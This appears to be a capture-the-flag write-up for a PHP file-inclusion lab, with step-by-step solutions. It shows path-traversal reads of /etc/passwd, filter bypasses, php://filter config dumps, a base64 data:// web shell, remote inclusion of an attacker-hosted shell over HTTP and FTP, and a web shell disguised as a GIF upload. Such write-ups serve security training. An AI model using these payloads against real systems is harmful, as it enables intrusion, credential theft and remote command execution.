# Local File Inclusion (LFI)

#### Questions

+ 0  Using the file inclusion find the name of a user on the system that starts with "b".

```url
http://94.237.60.55:49722/index.php?language=../../../../etc/passwd
```

+ 1  Submit the contents of the flag.txt file located in the /usr/share/flags directory.

```url
http://94.237.60.55:49722/index.php?language=../../../../usr/share/flags/flag.txt
```

# Basic Bypasses

#### Questions
+ 1  The above web application employs more than one filter to avoid LFI exploitation. Try to bypass these filters to read /flag.txt

```url
http://94.237.51.163:39103/index.php?language=languages/..././..././..././..././etc/passwd
```


# PHP Filters

#### Questions
+ 1  Fuzz the web application for other php scripts, and then read one of the configuration files and submit the database password as the answer

FUZZING file:

```zsh
ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt:FUZZ -u http://94.237.60.55:53128/FUZZ.php
```

```
configure               [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 257ms]
```

Try to get content of `configure.php`

![](images/1.png)

We need to use php base64 filter

```url
http://94.237.60.55:53128/index.php?language=php://filter/read=convert.base64-encode/resource=configure
```

![](images/2.png)

# PHP Wrappers

#### Questions
+ 1  Try to gain RCE using one of the PHP wrappers and read the flag at /

Get config file

```zsh
curl "http://94.237.60.55:41765/index.php?language=php://filter/read=convert.base64-encode/resource=../../../../etc/php/7.4/apache2/php.ini"
```

![](images/3.png)

Prepare payload

```zsh
echo '<?php system($_GET["cmd"]); ?>' | base64 -w 0
```

Url encoded

```
PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D
```

Test payload

```zsh
curl 'http://94.237.60.55:41765/index.php?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&cmd=id' | grep uid
```

Get flag

```zsh
curl 'http://94.237.60.55:41765/index.php?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&cmd=cat%20/37809e2f8952f06139011994726d9ef1.txt' | grep 'HTB{'
```


# Remote File Inclusion (RFI)
#### Questions
+ 1  Attack the target, gain command execution by exploiting the RFI vulnerability, and then look for the flag under one of the directories in /

Set up payload

```zsh
echo '<?php system($_GET["cmd"]); ?>' > shell.php
```

Test RFI

```zsh
curl http://10.129.29.114/index.php?language=http://10.10.14.210/
```

Confirm this has RFI

![](images/4.png)

Maybe our payload filtered

![](images/5.png)

Try ftp

```zsh
sudo python3 -m pyftpdlib -u test -P test -p 21
```

```url
http://10.129.29.114/index.php?language=ftp://test:test@10.10.14.210/shell.php&cmd=cat%20/exercise/flag.txt
```

# LFI and File Uploads

#### Questions
+ 1  Use any of the techniques covered in this section to gain RCE and read the flag at /

```zsh
echo 'GIF8<?php system($_GET["cmd"]); ?>' > shell.gif
```

![](images/6.png)

Get flag

```url
http://94.237.61.242:39984/index.php?language=./profile_images/shell.gif&cmd=cat%20/2f40d853e2d4768d87da1c81772bae0a.txt
```

